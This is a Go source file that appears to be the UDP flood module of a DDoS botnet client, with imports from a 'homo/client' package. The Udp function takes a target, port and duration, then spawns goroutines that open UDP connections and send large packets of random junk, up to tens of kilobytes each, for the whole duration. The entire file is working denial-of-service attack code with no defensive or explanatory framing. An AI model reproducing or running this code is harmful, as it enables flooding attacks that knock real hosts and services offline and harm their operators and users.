package methods

import (
	"fmt"
	"homo/client/balancer"
	"homo/client/utils"
	"net"
	"strconv"
	"strings"
	"time"
)

func Udp(target string, port string, duration string) {

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		go udpcon(target, port)
		time.Sleep(100 * time.Millisecond)
		go udpcon(target, port)
	}

}

func udpcon(target string, port string) {
UDP:

	dial := net.Dialer{Timeout: 20 * time.Second, LocalAddr: nil, DualStack: false, KeepAlive: 1000}
	con, err := dial.Dial("udp", target+":"+port)

	if err != nil {
		fmt.Println(err)
		goto UDP
	}

	defer con.Close()

	for i := 0; i < 20; i++ {
		select {
		case <-balancer.BalanceCh:

			fmt.Println("balancer")
			time.Sleep(5 * time.Second)
		default:

			fmt.Println(i)
			go sendudp(con, "nilpayload", 50000)
			go sendudp(con, "maxpayload", 20000)
			go sendudp(con, "random", 3000*i)

			time.Sleep(500 * time.Millisecond)
		}
	}
}

func sendudp(con net.Conn, payload string, size int) {

	var packet []byte

	switch payload {
	case "nilpayload":
		payload := make([]byte, size)

		payload = append(payload, byte(utils.RandomInt(2)), byte(utils.RandomInt(1)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2)))
		packet = payload
	case "maxpayload":
		payload := make([]byte, 0)

		for i := 0; i <= size; i++ {
			payload = append(payload, byte(utils.RandomInt(2)))
		}

		packet = payload

	case "random":
		var bytestr string

		for i := 0; i <= size; i++ {
			bytestr += strconv.Itoa(utils.RandomInt(2))
		}

		var res string
		for _, i := range bytestr {
			res += string(i >> 4 * 4)
		}
		packet = []byte(res)

	}

	_, err := con.Write(packet)

	if err != nil {
		fmt.Println(err)
		return
	}
}
